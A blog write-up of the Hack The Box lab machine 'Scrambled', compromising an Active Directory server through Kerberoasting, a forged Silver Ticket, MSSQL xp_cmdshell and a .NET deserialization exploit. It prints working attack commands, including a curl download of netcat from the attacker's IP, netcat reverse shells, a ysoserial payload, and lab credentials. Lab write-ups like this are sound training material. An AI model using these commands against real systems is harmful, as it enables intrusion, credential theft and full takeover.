---
title: "Scrambled HTB write up"
layout: post
date: 2024-07-12 13:10
image: /assets/images/machineLogos/Scrambled.png
headerImage: true
projects: false
hidden: false
tag:
- Active Directory
- SMB 
- Silver Ticket Attack
- Kerberos
- Deserialization
description: "Scrambled HTB machine write up"
category: blog
author: du4llt3t
externalLink: false
---

The Scramble machine on HTB is an interesting machine to apply and understand the concept of the Silver Ticket attack, in addition to applying a deserialization attack and other interesting techniques.

The first step is to conduct the reconnaissance process, starting with a simple ping to the machine to determine if it is active and to identify the operating system.
```bash
ping -c 1 10.10.11.168
```
![image](/assets/images/ScrambleImage/1.png)

After the ping, the TTL value indicates that the machine is running Windows, as it is close to 128. Next, perform a scan with Nmap to determine the open ports and services running on the machine

```bash
nmap -p- --min-rate 5000 --open -vvv -sS 10.10.11.168 -oG allports
```
```bash
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49688,49695,60688 -sCV 10.10.11.168 -oN targeted
```
![image](/assets/images/ScrambleImage/nmapScan.png)

Since ports 139 and 445 are open, the next step is to perform a simple enumeration on these ports using different tools until an interesting response is obtained.

```bash
crackmapexec smb 10.10.11.168
```
![image](/assets/images/ScrambleImage/2.png)
```bash
smbclient -L 10.10.11.168 -N
```
![image](/assets/images/ScrambleImage/4.png)
```bash
rpcclient -U "" 10.10.11.168 -N
```
![image](/assets/images/ScrambleImage/5.png)
```bash
smbmap -H 10.10.11.168 -u "null"
```
![image](/assets/images/ScrambleImage/7.png)

After all these scans, it is determined that NTLM authentication is disabled. Therefore, another entry point must be found. In this case, port 389 (LDAP) is open, and the Nmap scan reveals the CommonName, which can be added to the /etc/hosts file on the attacker's machine
![image](/assets/images/ScrambleImage/8.png)
![image](/assets/images/ScrambleImage/9.png)

Using the ldapsearch tool, it is possible to enumerate and try to find additional information on the machine by using the naming contexts and domain names.

```bash
ldapsearch -x -H ldap://10.10.11.168:389 -s base namingcontexts
```
![image](/assets/images/ScrambleImage/10.png)
```bash
ldapsearch -x -H ldap://10.10.11.168:389 -b "DC=scrm,DC=local"
```
![image](/assets/images/ScrambleImage/11.png)

After a while, it is determined that more information cannot be obtained without valid credentials. Looking again at the open ports, port 1433, which corresponds to MSSQL, is found. The next step is to try to connect to this service using the default credentials *sa:RPSsql12345*
```bash
mssqlclient.py srcm.local/sa:@10.10.11.168
```
![image](/assets/images/ScrambleImage/13.png)

Since access to MSSQL is not available, the next step is to try to connect to another service on port 4411.
```bash
nc 10.10.11.168 4411
```
![image](/assets/images/ScrambleImage/14.png)

Next, on the webpage, after inspecting their resources, a username is found exposed in an image. This user may be a valid system user. To determine if the user is valid on the machine, the tool Kerbrute can be used [kerbrute github](https://github.com/ropnop/kerbrute) __Download the repository and do a go build -ldflags -s -w__.

![image](/assets/images/ScrambleImage/15.png)
![image](/assets/images/ScrambleImage/16.png)

Next, a list of users needs to be created, including the user 'ksimpson'. Using Kerbrute, it can be determined if this user is valid.
![image](/assets/images/ScrambleImage/17.png)
```bash
kerbrute userenum --dc 10.10.11.168 -d scrm.local names
```
![image](/assets/images/ScrambleImage/18.png)
Having obtained a valid user, the next step is to attempt an ASREPRoast attack to obtain an NTLM hash containing the user's password.
```bash
GetNPUsers.py scrm.local/ -no-pass -usersfile names
```
![image](/assets/images/ScrambleImage/19.png)
Since the user is not vulnerable to ASREPRoast, the next step is to attempt a Kerberoasting attack. However, to proceed with this attack, the credentials of the user are required. Using Kerbrute, it may be possible to find the password by trying the username as the password, such as 'ksimpson.
```bash
kerbrute bruteuser --dc 10.10.11.168 -d scrm.local names ksimpson
```
![image](/assets/images/ScrambleImage/21.png)
Since the credentials are valid, the next step is to attempt Kerberoasting in order to obtain a TGS (Ticket Granting Service) and crack it.
```bash
GetUserSPNs.py scrm.local/ksimpson:ksimpson
```
![image](/assets/images/ScrambleImage/22.png)
Because NTLM authentication does not work, an attempt is made to use Kerberos authentication. However, when the script is executed with the 'k' parameter, it fails. To fix this issue, it is necessary to change the line in the script from *target=self.getMachineName* to *target=self.__kdcHost*.
![image](/assets/images/ScrambleImage/24.png)
```bash
GetUserSPNs.py scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
```
![image](/assets/images/ScrambleImage/28.png)

With the tool working, it is possible to obtain a TGS and use it to crack the password and identify the user running the service.

```bash
GetUserSPNs.py scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -request
```
![image](/assets/images/ScrambleImage/29.png)

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```
![image](/assets/images/ScrambleImage/31.png)
![image](/assets/images/ScrambleImage/30.png)

Once the password is cracked, the credentials of the user running the service can be obtained. An attempt can be made to connect to the MSSQL service, but this will not work. Alternatively, attempts can be made to create a TGT for the users sqlsvc and ksimpson and connect to the service, but these will also fail.

![image](/assets/images/ScrambleImage/32.png)
![image](/assets/images/ScrambleImage/36.png)
![image](/assets/images/ScrambleImage/39.png)

Because the credentials of the user running the MSSQL service are available *sqlsvc:Pegasus60*, the next step is to perform the Silver Ticket Attack. This involves creating a TGS as an Administrator user to gain access to the MSSQL service, using the service account credentials, the domain SID, and the Service Principal Name (SPN).

1. The first step is to create an NTLM hash with the password of the user running the service, using a web tool, and convert the hash from upper case to lower case.
![image](/assets/images/ScrambleImage/41.png)
```bash
echo "B999A16500B87D17EC7F2E2A68778F05" | tr '[A-Z]' '[a-z]'
```
![image](/assets/images/ScrambleImage/42.png)
2. Obtain the domain SID of the administrator user using the tool GetPAC. The user can be identified as an administrator if the userID is 500.
```bash
getPac.py scrm.local/ksimpson:ksimpson -targetUser administrator
```
![image](/assets/images/ScrambleImage/43.png)
![image](/assets/images/ScrambleImage/44.png)
3. With all the information gathered, the next step is to use the Ticketer tool to obtain a TGS for the administrator user.
```bash
ticketer.py -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator -domain scrm.local
```
![image](/assets/images/ScrambleImage/45.png)

By changing the environment variable and attempting to connect to the MSSQL service, it is possible to gain access.

```bash
export KRB5CCNAME=Administrator.ccache
```
```bash
mssqlclient.py dc1.scrm.local -k
```
![image](/assets/images/ScrambleImage/46.png)

Now, in MSSQL, the next step is to try using the command xp\_cmdshell to execute commands.
```bash
xp_cmdshell "whoami"
```
![image](/assets/images/ScrambleImage/47.png)

This error occurs because the xp\_cmdshell function is disabled. To enable remote command execution, it is necessary to change the service configurations and enable the function.
```bash
SP_CONFIGURE "show advanced options", 1
```
![image](/assets/images/ScrambleImage/48.png)
```bash
RECONFIGURE
```
```bash
SP_CONFIGURE "xp_cmdshell", 1
```
![image](/assets/images/ScrambleImage/49.png)
```bash
xp_cmdshell "whoami"
```
![image](/assets/images/ScrambleImage/50.png)

Now, with command execution enabled, it is possible to gain a shell by sharing the Netcat executable from the attacker machine and downloading it onto the victim machine using Python. This will allow for the execution of a reverse shell.
```bash
xp_cmdshell "curl http://10.10.14.9/nc.exe -o C:\Temp\netcat.exe"
```
![image](/assets/images/ScrambleImage/51.png)
```bash
xp_cmdshell "C:\Temp\netcat.exe -e cmd 10.10.14.9 443"
```
![image](/assets/images/ScrambleImage/52.png)

# Privilege Escalation

With the database compromised, it is possible to find the credentials of the user MiscSvc
```mssql
SELECT name FROM master.sys.databases;
```
![image](/assets/images/ScrambleImage/58.png)
```mssql
select table_name from ScrambleHR.information_schema.tables;
```
![image](/assets/images/ScrambleImage/59.png)
```mssql
select * from UserImport
```
![image](/assets/images/ScrambleImage/60.png)
Now, with the credentials of the user *MiscSvc:ScrambledEggs9900*, it is possible to create a credential and execute commands as the user MiscSvc.
```powershell
powershell
# Create the user
$user = 'scrm.local\miscsvc'
# Password to secure string
$password = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlaintext -Force
# Create credential.
$cred = New-Object System.Management.Automation.PSCredential($user,$password)
# Known the hostname of the machine
hostname
# Executing a command as the other user
Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock {whoami}
```
![image](/assets/images/ScrambleImage/62.png)
Now, with this command execution, it is possible to create a reverse shell as the new user.
```powershell
Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock {C:\Temp\netcat.exe -e cmd 10.10.14.9 443}
```
![image](/assets/images/ScrambleImage/63.png)
With this shell, it is possible to search for vulnerabilities or sensitive files on the machine. In the directory 'C:\Shares\It\Apps\Sale Order Client', an executable file and a DLL file are found, which can be downloaded to our machine.
```bash
smbclient.py scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local -k
```
![image](/assets/images/ScrambleImage/64.png)

With this shell, it is possible to search for vulnerabilities or sensitive files on the machine. In the directory 'C:\Shares\It\Apps\Sale Order Client', an executable file and a DLL file are found, which can be downloaded to our machine.

![image](/assets/images/ScrambleImage/65.png)
![image](/assets/images/ScrambleImage/66.png)

Once a Windows debugger machine is set up, it is necessary to download OpenVPN to connect to the machine. Additionally, the domain name needs to be added to the hosts file of the Windows machine at C:\Windows\System32\drivers\etc\hosts.

![image](/assets/images/ScrambleImage/67.png)
![image](/assets/images/ScrambleImage/68.png)
![image](/assets/images/ScrambleImage/70.png)

Now, it is possible to try connecting to the service using the application and observe the logs that the application generates.

![image](/assets/images/ScrambleImage/71.png)
![image](/assets/images/ScrambleImage/72.png)

Because access as a valid user is not possible, [dnSpy](https://github.com/dnSpy/dnSpy) will be used to debug the file and look for hidden information dnSpy. By analyzing the DLL file, it can be determined that the application uses serialized data and has a developer mode.

![image](/assets/images/ScrambleImage/74.png)
![image](/assets/images/ScrambleImage/75.png)

Now, the username *scrmdev* can be used to bypass the developer mode and gain access to the service.

![image](/assets/images/ScrambleImage/76.png)
![image](/assets/images/ScrambleImage/77.png)

In the New Order panel, data can be sent while observing the log output.

![image](/assets/images/ScrambleImage/78.png)
![image](/assets/images/ScrambleImage/79.png)

Now, ysoserial.exe can be used to create a malicious payload and send a reverse shell to our attacker machine.

```cmd
ysoserial.exe -g windowsIdentity -f binaryFormatter -o base64 -c "C:\Temp\netcat.exe -e cmd 10.10.14.9  443"
```
![image](/assets/images/ScrambleImage/80.png)
![image](/assets/images/ScrambleImage/81.png)
![image](/assets/images/ScrambleImage/82.png)

Finally, we can attempt to connect to the service on port 4411 using netcat, send the payload, and set netcat to listener mode to receive the connection.
```bash
nc 10.10.11.168 4411
```
```bash
rlwrap nc -nlvp 443
```
![image](/assets/images/ScrambleImage/83.png)
![image](/assets/images/ScrambleImage/84.png)
![image](/assets/images/ScrambleImage/85.png)

Finally, we gain access to the machine as the user nt authority\system, and the machine is PWNED.
